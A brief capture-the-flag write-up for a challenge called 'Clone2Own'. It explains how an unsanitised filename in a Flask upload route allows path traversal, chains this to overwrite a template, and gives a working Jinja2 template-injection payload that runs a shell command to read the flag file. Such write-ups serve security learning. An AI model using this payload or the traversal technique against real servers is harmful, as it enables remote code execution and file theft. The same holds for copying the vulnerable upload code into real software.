# Pokemon 1
`Clone2Own`
We note that in the `app.py` file which is the main flask application, the following code handles the upload functionality:
```python
@app.route('/uploadfile', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        print(request)

        if request.files.get('file'):
            # read the file
            file = request.files['file']

            # read the filename
            filename = file.filename

            # create a path to the uploads folder
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)

            # Save the file to the uploads folder
            file.save(filepath)
```
This functionality checks server-side, if a POST request is being sent, and if it is it looks for the parameter `file`, which it will add to the result of `os.path.join`.  Doing a simple test:
```python
>>> os.path.join("/home/cave", "hello")
'/home/cave/hello'
>>> os.path.join("/home/cave", "../hello")
'/home/cave/../hello'
```
We can see that we can have these `../` which will allow for path traversal. This means we can save files in other folders. Now what to we do with this? Well we note the following code also in `app.py`:
```python
@app.route('/')
def home():
    return render_template('index.html')
```
It renders the template. We can do server-side template injection here. Searching for `Jinja2 SSTI` online brings us to `Hacktricks` and I used something like this payload:
```python
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("cat /flag*").read() }}
```

Flag:
`TDCNET{POKEMON_DU_SKAL_FANGE_DEEEEEEM_DET_KRU+00E6VER_BU+00E5DE_MOD_OG_HELD}`
